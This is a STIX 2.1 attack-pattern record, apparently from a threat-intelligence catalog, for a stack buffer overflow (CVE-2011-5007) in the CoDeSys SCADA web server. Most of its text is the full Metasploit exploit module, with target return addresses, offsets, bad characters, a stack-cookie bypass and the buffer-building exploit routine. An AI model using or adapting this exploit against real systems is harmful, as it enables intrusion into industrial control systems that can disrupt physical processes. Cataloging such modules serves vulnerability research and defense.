{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--80f1803e-a9d0-46a7-811e-85b81ed06d78",
    "created": "2024-08-14T16:39:36.56207Z",
    "modified": "2024-08-14T16:39:36.562074Z",
    "name": "SCADA 3S CoDeSys CmpWebServer Stack Buffer Overflow",
    "description": " This module exploits a remote stack buffer overflow vulnerability in 3S-Smart Software Solutions product CoDeSys Scada Web Server Version 1.1.9.9. This vulnerability affects versions 3.4 SP4 Patch 2 and earlier.  'License'         => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/scada/codesys_web_server.rb",
            "external_id": "codesys_web_server.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2011-5007"
        },
        {
            "source_name": "reference",
            "url": "http://aluigi.altervista.org/adv/codesys_1-adv.txt"
        },
        {
            "source_name": "reference",
            "url": "https://www.cisa.gov/uscert/ics/alerts/ICS-ALERT-11-336-01A"
        },
        {
            "source_name": "reference",
            "url": "https://www.cisa.gov/uscert/ics/advisories/ICSA-12-006-01"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::Tcp\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'            => 'SCADA 3S CoDeSys CmpWebServer Stack Buffer Overflow',\n      'Description'     => %q{\n        This module exploits a remote stack buffer overflow vulnerability in\n        3S-Smart Software Solutions product CoDeSys Scada Web Server Version\n        1.1.9.9. This vulnerability affects versions 3.4 SP4 Patch 2 and\n        earlier.\n      },\n      'License'         => MSF_LICENSE,\n      'Author'          =>\n        [\n          'Luigi Auriemma', # Original discovery and poc\n          'Celil UNUVER',\n          'TecR0c <roccogiovannicalvi[at]gmail.com>', # Module Metasploit\n          'sinn3r',\n          'Michael Coppola'\n        ],\n      'References'      =>\n        [\n          [ 'CVE', '2011-5007'],\n          [ 'OSVDB', '77387'],\n          [ 'URL', 'http://aluigi.altervista.org/adv/codesys_1-adv.txt' ],\n          [ 'EDB', '18187' ],\n          [ 'URL', 'https://www.cisa.gov/uscert/ics/alerts/ICS-ALERT-11-336-01A' ],\n          # The following clearifies why two people are credited for the discovery\n          [ 'URL', 'https://www.cisa.gov/uscert/ics/advisories/ICSA-12-006-01']\n        ],\n      'DefaultOptions'  =>\n        {\n          'EXITFUNC' => 'process',\n          'DisablePayloadHandler' => false\n        },\n      'Platform'        => 'win',\n      'Payload'         =>\n        {\n          'size'     => 650,\n          'BadChars' => \"\\x00\\x09\\x0a\\x3f\\x20\\x23\\x5e\\x25\\x3a\\x5c\",\n        },\n\n      'Targets'         =>\n        [\n          [\n            'CoDeSys v2.3 on Windows XP SP3',\n            {\n              'Ret'    => 0x7E4456F7, # jmp esp user32\n              'Offset' => 775\n            }\n          ],\n          [\n            'CoDeSys v3.4 SP4 Patch 2 on Windows XP SP3',\n            {\n              # Abuse a memcpy() call to circumvent stack cookies\n              'Offset' => 525,\n              'Ret'    => 0x02CDFD68,\n              'Src'    => 0x02CDFD58,\n              'Dest'   => 0x02CDFA14\n            }\n          ],\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2011-12-02'\n    ))\n\n    register_options([Opt::RPORT(8080)])\n  end\n\n  def check\n    connect\n    sock.put(\"GET / HTTP/1.1\\r\\nHost: #{rhost}\\r\\n\\r\\n\")\n    res = sock.get_once\n    disconnect\n\n    # Can't flag the web server as vulnerable, because it doesn't\n    # give us a version\n    vprint_line(res.to_s)\n    if res.to_s =~ /3S_WebServer/\n      return Exploit::CheckCode::Detected\n    else\n      return Exploit::CheckCode::Safe\n    end\n  end\n\n  def exploit\n    connect\n\n    if target.name =~ /v2\\.3/\n      buffer =  rand_text(target['Offset'])\n      buffer << [target.ret].pack('V')\n      buffer << make_nops(8)\n      buffer << payload.encoded\n\n    else\n      # CoDeSys v3.4 SP4 Patch 2 on Windows XP SP3\n      buffer =  rand_text_alphanumeric(target['Offset'])\n      buffer << [target.ret].pack('V')\n      buffer << [target['Src']].pack('V')\n      buffer << [target['Dest']].pack('V')\n      buffer << [0x7FFFFFFF].pack('V') # Satisfy signed comparison\n      buffer << make_nops(8)\n      buffer << payload.encoded\n      buffer << \"\\\\a\"\n    end\n\n    sploit = \"GET /#{buffer} HTTP/1.0\\r\\n\\r\\n\\r\\n\"\n\n    print_status(\"Trying target #{target.name}...\")\n    sock.put(sploit)\n    res = sock.get_once(-1, 5)\n    print_line(res) unless res.nil?\n\n    handler\n    disconnect\n  end\nend\n\n=begin\ntarget.ret verified on:\n- Win XP SP3 unpatched\n- Win XP SP3 fully-patched\n- Win XP SP3 fully-patched with Office 2007 Ultimate SP2 installed\n=end\n",
    "x_mitre_disclosure_date": "2011-12-02",
    "x_mitre_platforms": [
        "win'"
    ]
}